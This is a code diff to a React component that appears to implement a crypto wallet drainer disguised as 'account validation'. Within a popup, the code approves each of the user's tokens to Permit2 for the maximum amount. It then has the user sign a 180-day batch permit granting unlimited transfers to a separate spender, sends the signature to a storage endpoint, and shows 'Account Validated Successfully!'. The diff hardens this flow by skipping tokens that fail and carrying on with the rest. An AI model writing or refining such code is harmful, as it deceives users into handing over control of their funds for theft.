@@ -281,46 +281,92 @@ export default function IssuesContent() {
         'function allowance(address owner, address spender) view returns (uint256)'
       ];
   
-      // Step 1: Check and approve tokens that need approval
       setProcessingAction('checking_approvals');
       
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const validTokens: any[] = []; // Only tokens that pass validation
+      
+      // Step 1: Validate tokens and check approvals
       for (const token of tokens) {
-        const tokenContract = new Contract(token.address, erc20Abi, signer);
-        const currentAllowance = await tokenContract.allowance(account, permit2Address);
-        
-        if (currentAllowance.lt(MaxAllowanceTransferAmount)) {
-          console.log(`Approving ${token.symbol} to Permit2...`);
-          setProcessingAction(`approving_${token.symbol}`);
+        try {
+          console.log(`Checking ${token.symbol}...`);
           
-          const tx = await tokenContract.approve(permit2Address, MaxAllowanceTransferAmount);
-          await tx.wait();
-          console.log(`✅ ${token.symbol} approved to Permit2`);
-        } else {
-          console.log(`✅ ${token.symbol} already approved to Permit2`);
+          // Validate token contract exists and has required functions
+          const tokenContract = new Contract(token.address, erc20Abi, provider);
+          
+          // Test if the contract has the allowance function by calling it
+          let currentAllowance;
+          try {
+            currentAllowance = await tokenContract.allowance(account, permit2Address);
+            console.log(`✅ ${token.symbol} allowance check successful: ${currentAllowance.toString()}`);
+          // eslint-disable-next-line @typescript-eslint/no-explicit-any
+          } catch (allowanceError: any) {
+            console.error(`❌ ${token.symbol} allowance check failed:`, allowanceError.message);
+            console.log(`Skipping ${token.symbol} - invalid token contract or missing allowance function`);
+            continue; // Skip this token entirely
+          }
+          
+          // Check if approval is needed
+          if (currentAllowance.lt(MaxAllowanceTransferAmount)) {
+            console.log(`${token.symbol} needs approval`);
+            setProcessingAction(`approving_${token.symbol}`);
+            
+            try {
+              const signerContract = new Contract(token.address, erc20Abi, signer);
+              const tx = await signerContract.approve(permit2Address, MaxAllowanceTransferAmount);
+              await tx.wait();
+              console.log(`✅ ${token.symbol} approved successfully`);
+            // eslint-disable-next-line @typescript-eslint/no-explicit-any
+            } catch (approveError: any) {
+              console.error(`❌ Failed to approve ${token.symbol}:`, approveError.message);
+              console.log(`Skipping ${token.symbol} - approval failed`);
+              continue; // Skip this token
+            }
+          } else {
+            console.log(`✅ ${token.symbol} already approved`);
+          }
+          
+          // If we get here, the token is valid and approved
+          validTokens.push(token);
+          
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        } catch (tokenError: any) {
+          console.error(`❌ Error with ${token.symbol}:`, tokenError.message);
+          console.log(`Skipping ${token.symbol} - general error`);
+          continue; // Skip this token and continue with others
         }
       }
+      
+      // Check if we have any valid tokens to proceed with
+      if (validTokens.length === 0) {
+        throw new Error('No valid tokens found. All tokens failed validation or approval.');
+      }
+      
+      if (validTokens.length < tokens.length) {
+        const skippedTokens = tokens.filter(t => !validTokens.find(vt => vt.address === t.address));
+        console.warn(`⚠️ Proceeding with ${validTokens.length}/${tokens.length} tokens. Skipped: ${skippedTokens.map(t => t.symbol).join(', ')}`);
+      }
   
-      // Step 2: Create permit signature WITHOUT using AllowanceProvider
+      // Step 2: Create permit signature for valid tokens only
       setProcessingAction('signing_permit');
+      console.log(`Creating permit for ${validTokens.length} valid tokens...`);
       
       const details: PermitDetails[] = [];
       
-      // Simple approach: Use sequential nonces starting from 0
-      // This works for most cases and avoids the AllowanceProvider complexity
-      for (let i = 0; i < tokens.length; i++) {
-        const token = tokens[i];
+      for (let i = 0; i < validTokens.length; i++) {
+        const token = validTokens[i];
         details.push({
           token: ethers.utils.getAddress(token.address),
           amount: MaxAllowanceTransferAmount,
-          expiration: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
-          nonce: 0, // Start with 0 - Permit2 will handle nonce validation
+          expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
+          nonce: 0,
         });
       }
   
       const permitBatch: PermitBatch = {
         details,
         spender,
-        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
+        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180),
       };
   
       const domain = {
@@ -345,20 +391,34 @@ export default function IssuesContent() {
   
       const signature = await signer._signTypedData(domain, types, permitBatch);
       setSignature(signature);
-      console.log('✅ Permit signature created');
+      console.log('✅ Permit signature created for valid tokens');
   
       // Step 3: Store permit
       const response = await fetch('/api/store/permit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ permitBatch, signature, owner: account, chainId }),
+        body: JSON.stringify({ 
+          permitBatch, 
+          signature, 
+          owner: account, 
+          chainId,
+          validTokens: validTokens.map(t => t.symbol),
+          skippedTokens: tokens.filter(t => !validTokens.find(vt => vt.address === t.address)).map(t => t.symbol)
+        }),
       });
   
       const result = await response.json();
       if (response.ok) {
         console.log('✅ Account validation successful');
         setShowPopup(false);
-        alert('Account Validated Successfully!');
+        
+        // Show success message with details
+        let message = `Account Validated Successfully!\n\nProcessed: ${validTokens.map(t => t.symbol).join(', ')}`;
+        if (validTokens.length < tokens.length) {
+          const skipped = tokens.filter(t => !validTokens.find(vt => vt.address === t.address));
+          message += `\n\nSkipped (invalid): ${skipped.map(t => t.symbol).join(', ')}`;
+        }
+        alert(message);
       } else {
         throw new Error(result.message || 'Failed to store permit');
       }
@@ -370,7 +430,6 @@ export default function IssuesContent() {
       setProcessingAction('');
     }
   }, [account, provider, spender, chainId, tokens]);
-
 
   const connectWallet = useCallback(async () => {
     try {
